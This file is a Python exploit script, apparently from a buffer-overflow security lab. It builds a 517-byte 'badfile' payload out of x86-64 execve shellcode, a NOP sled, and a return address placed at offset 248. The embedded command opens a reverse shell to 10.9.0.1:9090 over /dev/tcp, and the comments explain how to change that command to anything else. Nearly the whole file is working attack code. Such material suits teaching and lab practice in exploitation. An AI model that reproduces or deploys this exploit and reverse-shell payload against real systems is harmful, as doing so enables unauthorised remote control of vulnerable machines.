#!/usr/bin/python3
import sys

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1; echo ok  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# Configuration
rbp = 0x00007fffffffe420
buffer = 0x00007fffffffe330

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Adjust the placement of the shellcode from the end to the beginning of the payload. 
# I chose a threshold of 8 to be the starting point.
start = 8
content[start:start + len(shellcode)] = shellcode

# The desirable return address should be somewhere before the start of the shellcode, 
# and needs to fall right at a NOP sled. 
# I will set its location at the fourth position of the buffer.
ret = buffer + 4

# We could estimate the buffer size of around rbp-buffer = 240. 
# Therefore, the index of return address bucket of the stack is larger than 240. 
# I incrementally tried a few values after 240 and got to know that index 248 works.
offset = 248
content[offset:offset + 8] = (ret).to_bytes(8, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)